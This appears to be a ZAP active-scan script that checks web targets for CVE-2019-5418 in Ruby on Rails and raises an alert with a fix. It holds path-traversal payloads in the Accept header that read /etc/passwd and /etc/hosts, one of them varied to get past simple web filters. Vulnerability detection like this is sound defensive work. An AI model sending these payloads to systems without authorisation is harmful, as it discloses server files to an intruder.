// Note that new active scripts will initially be disabled
// Right click the script in the Scripts tree and select "enable" 

// This active scanner script checks for CVE-2019-5418

/**
 * Scans a "node", i.e. an individual entry in the Sites Tree.
 * The scanNode function will typically be called once for every page. 
 * 
 * @param as - the ActiveScan parent object that will do all the core interface tasks 
 *     (i.e.: sending and receiving messages, providing access to Strength and Threshold settings,
 *     raising alerts, etc.). This is an ScriptsActiveScanner object.
 * @param msg - the HTTP Message being scanned. This is an HttpMessage object.
 */
function scanNode(as, msg) {
    // Set some details we will need for alerts later
    var alertRisk = 3
    var alertConfidence = 2
    var alertTitle = 'CVE-2019-5418 - File Content Disclosure'
    var alertDesc = 'The application seems to be subject to CVE-2019-5418. \
By sending a specially crafted request it was possible to have the target return \
data from the server file system.'
    var alertSolution = 'Upgrade to a version of Ruby/Rails where this issue is fixed. (See references for further details).'
    var alertInfo = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5418\nhttps://github.com/mpgn/CVE-2019-5418'
    var cweId = 74 //Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')
    var wascId = 33 // Path Traversal
    var url = msg.getRequestHeader().getURI().toString();

    var msg2 = msg.cloneRequest();
    msg2.getRequestHeader().setHeader("Accept", "../../../../../../../../etc/passwd{{")

    as.sendAndReceive(msg2, false, true);

    var re = /root:.:0:0/g
    var body = msg2.getResponseBody().toString()

    if (re.test(body)) {
        as.raiseAlert(alertRisk, alertConfidence, alertTitle, alertDesc, 
          url, '', '', alertInfo, alertSolution, body.match(re)[0], cweId, wascId, msg2);
        return; // No need to try further
    }
    // Just in case there's a simple WaF
    var msg3 = msg.cloneRequest();
    msg3.getRequestHeader().setHeader("Accept", "../../../../../../../../../../../../../etc/hosts{{")

    as.sendAndReceive(msg3, false, true);

    re = /127.0.0.1/g
    body = msg3.getResponseBody().toString()
    if (re.test(body)) {
        as.raiseAlert(alertRisk, alertConfidence, alertTitle, alertDesc, 
          url, '', '', alertInfo, alertSolution, body.match(re)[0], cweId, wascId, msg3);
    }
}

function scan(as, msg, param, value) {
    //Unused
}
